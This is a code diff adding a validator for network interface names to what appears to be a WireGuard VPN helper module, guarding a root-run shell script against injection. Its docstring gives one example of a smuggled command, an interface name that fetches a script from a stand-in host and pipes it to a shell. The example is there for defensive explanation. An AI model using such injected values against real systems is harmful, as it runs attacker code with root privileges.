@@ -13,6 +13,7 @@ from __future__ import annotations
 
 import ipaddress
 import random
+import re
 from typing import Iterable, List, Optional, Set, Tuple
 
 # Ranges that are private, and therefore safe to use for a VPN without
@@ -190,3 +191,42 @@ def looks_like_hostname(value: str) -> bool:
                all(c.isalnum() or c == "-" for c in l) and
                not l.startswith("-") and not l.endswith("-")
                for l in labels)
+
+
+# --------------------------------------------------------------------------- #
+# Names
+# --------------------------------------------------------------------------- #
+#: Linux caps an interface name at IFNAMSIZ-1 = 15 bytes, and the kernel itself
+#: rejects '/' and whitespace. Anything outside this is not a real interface,
+#: so refusing it costs nothing.
+IFACE_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,14}$")
+
+
+def validate_iface(name: str) -> Tuple[bool, str]:
+    """Is this a legal network interface name?
+
+    This is a security boundary, not a tidiness check. The name is used to
+    build file paths and is written into a shell script that runs as root from
+    wg-quick's PostUp. A name like ``wg0$(curl evil|sh)`` is a perfectly legal
+    *filename*, which means ``adopt`` - which learns the interface name by
+    listing /etc/wireguard - could otherwise carry an injection straight into
+    that script.
+    """
+    if not name:
+        return False, "an interface name is required"
+    if len(name) > 15:
+        return False, ("'{}' is {} characters; Linux allows at most 15"
+                       .format(name, len(name)))
+    if not IFACE_RE.match(name):
+        return False, ("'{}' is not a valid interface name - use letters, "
+                       "digits, dot, dash and underscore only".format(name))
+    return True, ""
+
+
+def require_iface(name: str) -> str:
+    """Validate or raise.  Use wherever a name crosses into path or shell use."""
+    from .errors import ValidationError
+    ok, why = validate_iface(name)
+    if not ok:
+        raise ValidationError("unsafe interface name", why)
+    return name
